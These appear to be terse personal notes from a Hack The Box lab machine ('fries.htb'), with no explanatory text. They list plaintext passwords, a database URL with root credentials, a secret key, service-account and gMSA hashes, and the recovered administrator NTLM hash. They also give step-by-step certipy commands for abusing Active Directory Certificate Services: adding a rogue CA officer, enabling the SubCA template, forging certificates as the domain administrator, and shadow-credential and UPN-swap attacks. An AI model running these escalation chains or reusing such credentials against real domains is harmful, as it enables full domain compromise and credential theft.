```
d.cooper@fries.htb / D4LE11maan!!

DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```
[[Z Assets/Images/Pasted image 20251123015255.jpeg|Open: Pasted image 20251123015255.png]]
![[Z Assets/Images/Pasted image 20251123015255.jpeg]]

```
ssh -u 'svc' -p 'Friesf00Ds2025!!'
```

```
rockon! 
svc_infra m6tneOMAh5p0wQ0d
gMSA_CA_prod$ fc20b3d3ec179c5339ca59fbefc18f4a

```


```
certipy ca \
    -u "$USER" -hashes :"$HASH" \
    -dc-ip "$IP" \
    -ca "$CA" -add-officer 'attacker'
    
certipy ca \
    -u "$USER" -hashes :"$HASH" \
    -dc-ip "$IP" \
    -ca "$CA" -enable-template 'SubCA'

certipy req \
    -u "$USER" -hashes :"$HASH" \
    -dc-ip "$IP" \
    -ca "$CA" -template 'SubCA' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-858338346-3861030516-3975240472-500'

certipy ca \
    -u "$USER" -hashes :"$HASH" \
    -dc-ip "$IP" \
    -ca "$CA" -issue-request '1'

certipy req \
    -u "$USER" -hashes :"$HASH" \
    -dc-ip "$IP" \
    -ca "$CA" -retrieve '1'

```


```
certipy req \
    -u "$USER" -p "$PASSWORD" \
    -dc-ip "$IP" -target "$CA"."$DOMAIN" \
    -ca "$CA" -template 'CLIENTAUTH' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-858338346-3861030516-3975240472-500'
    

certipy auth -pfx 'administrator.pfx' -dc-ip "$IP"


```


```
certipy account \
    -u "$USER" -p "$PASSWORD" \
    -dc-ip "$IP" -user 'victim' \
    read

certipy account \
    -u "$USER" -p "$PASSWORD" \
    -dc-ip "$IP" -upn 'administrator' \
    -user 'victim' update

certipy shadow \
    -u "$USER" -p "$PASSWORD" \
    -dc-ip "$IP" -account 'victim' \
    auto

export KRB5CCNAME=victim.ccache
certipy req \
    -k -dc-ip "$IP" \
    -target "$CA"."$DOMAIN" -ca "$CA" \
    -template 'User'

certipy account \
    -u "$USER" -p "$PASSWORD" \
    -dc-ip "$IP" -upn 'victim@corp.local' \
    -user 'victim' update

certipy auth \
    -dc-ip "$IP" -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'    


```

GMSA

```
certipy ca \
    -u "$USER" -hashes :"$HASH" \
    -dc-ip "$IP" \
    -ca "$CA" -add-officer "$USER"

certipy ca \
    -u "$USER" -hashes :"$HASH" \
    -dc-ip "$IP" \
    -ca "$CA" -add-officer "svc_infra"

certipy ca \
    -u "$USER" -hashes :"$HASH" \
    -dc-ip "$IP" \
    -ca "$CA" -add-manager "svc_infra"

certipy ca \
    -u "$USER" -hashes :"$HASH" \
    -dc-ip "$IP" \
    -ca "$CA" -enable-template 'SubCA'


certipy req \
    -u "$USER" -hashes :"$HASH" \
    -dc-ip "$IP" \
    -ca "$CA" -template 'SubCA' \
    -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500'
    

certipy ca \
    -u "$USER" -hashes :"$HASH" \
    -dc-ip "$IP" \
    -ca "$CA" -issue-request '1'

certipy req \
    -u "$USER" -hashes :"$HASH" \
    -dc-ip "$IP" \
    -ca "$CA" -retrieve '1'
    
'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```